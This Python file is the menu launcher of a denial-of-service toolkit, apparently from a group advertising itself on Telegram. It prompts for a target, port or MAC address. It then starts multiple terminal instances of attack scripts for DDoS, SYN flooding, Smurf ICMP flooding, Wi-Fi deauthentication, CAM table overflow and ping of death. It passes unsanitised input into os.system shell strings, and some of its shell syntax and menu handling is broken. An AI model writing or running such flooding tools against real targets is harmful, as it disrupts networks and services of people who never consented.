#! /usr/bin/env python3

from typing import Text
import pyautogui
from src import Attack
from src.Attack import CamTableOverFlow
from src.Attack import DDos
from src.Attack import pingofdeath
from src.Attack import requestX
from src.Attack import WifiDeauth
from src.Attack import SmurfAttack
from src.Attack import SynFlooding
from scapy.all import *
from scapy import *
import socket
import socketserver
import requests
import threading
import os,sys
import argparse
import random
import subprocess
import time


g="\033[92m"
b="\033[33m"
r="\033[31m"
p="\033[34m"
y="\033[35m"
d="\033[36m"
s="\033[0m"
color=[g,b,r,p,y,d]

rn = random.choice(color)

listtext = f"""
    {rn}
                                    ██              
                                    ██                
                                ▒▒                    
                            ▒▒░░▒▒                  
                            ████  ░░▒▒  ████          
                        ██  ▒▒░░▒▒                  
                        ██      ▒▒                    
                        ██          ██                
                    ██████          ██              
                    ██████                          
                ██████████████                      
                ██████████▒▒██████                    
            ██████████████▒▒▒▒████                  
            ████████████████▒▒▒▒██                  
            ██▓▓██████████████▒▒██                  
            ▓▓▒▒██████████████▒▒██                  
            ██▒▒██████████████▒▒██                  
            ████▒▒██████████▒▒████                  
                ████▒▒████████████                    
                ██████████████    {s}                  
            
                Denial of service 💣
              Remax Box Team Pentesting
          The Channel telegram {rn}@RemaxBoxTeam{s}
            
        {rn}01{s} DDos          Denial-of-sevice Attack
        {rn}02{s} Request       the overflow by request
        {rn}03{s} SynFlooding   Syn Flooding the target
        {rn}04{s} SmurfAttack   Icmp Flooding the target
        {rn}05{s} WifiDeath     Wifi Deathication attack
        {rn}06{s} CamOverFlow   MAC Addresing overflowing
        {rn}07{s} PingOfDaeth   Ping Of Death packet byte
        {rn}08{s} Other         other the script tools
        {rn}09{s} Exit          Exit the script tools     
"""

                              
                                                
 

class Menu:
    @classmethod
    def menu(cls):
        listmenu = [
            "Cam overFlow",
            "DDos",
            "request",
            "SynFlooding",
            "SmurfAttack",
            "WifiDeath",
            "ping of daeth"
        ]
        print(listtext)
    
    @classmethod
    def text(cls):
        text = """
        This is Script tools from all 
           attack Denial of service
              Remax Box Team !
"""
        return text

if __name__ in "__main__":
    while True:
        Menu.menu()
        chos = str(input(f"      {rn}>> {s}Chosie {rn}"))
        if chos == "1": 
            Target = str(input(f"      {rn}>> {s}Chosie Target {rn}"))
            portt = str(input(f"      {rn}>> {s}Chosie port {rn}"))
            df = "{1..6}"
            for i in range(4):
                os.system("for i in range{1..5};do gnome-terminal -- ./lib/DDos.py"+f" {Target} {portt};done")
        if chos == "3":
            Target = str(input(f"      {rn}>> {s}Chosie Target {rn}"))
            portt = str(input(f"      {rn}>> {s}Chosie port {rn}"))
            message = str(input(f"      {rn}>> {s}Chosie message {rn}"))
            for i in range(4):
                os.system("for i in range{1..5};do gnome-terminal -- ./lib/SynFlooding.py"+f" {Target} {portt} {message};done") 
        if chos == "4":
            Target = str(input(f"      {rn}>> {s}Chosie Target {rn}"))
            message = str(input(f"      {rn}>> {s}Chosie message {rn}"))
            for i in range(4):
                os.system("for i in range{1..5};do gnome-terminal -- ./lib/SmurfAttack.py"+f" {Target} {message} ;done") 
        if chos == "5":
            MACtarget = str(input(f"      {rn}>> {s}Chosie Target {rn}"))
            count = str(input(f"      {rn}>> {s}Chosie count {rn}"))
            Interface = str(input(f"      {rn}>> {s}Chosie Interface {rn}"))
            for i in range(4):
                os.system("for i in range{1..5};do gnome-terminal -- ./lib/WifiDeauth.py"+f" {MACtarget} {count} {Interface} ;done") 
        if chos == "6":
            for i in range(4):
                os.system("for i in range{1..5};do gnome-terminal -- ./lib/CamTableOverFlow.py"+f";done") 
        if chos == "7":
            Target = str(input(f"      {rn}>> {s}Chosie Target {rn}"))
            for i in range(4):
                os.system("for i in range{1..5};do gnome-terminal -- ./lib/pingofdeath.py"+f" {Target} ;done") 
        if chos == "9":break
        if chos == "8":print(rn),pyautogui.write(Menu.text(),interval=0.1),time.sleep(4)


# :)
        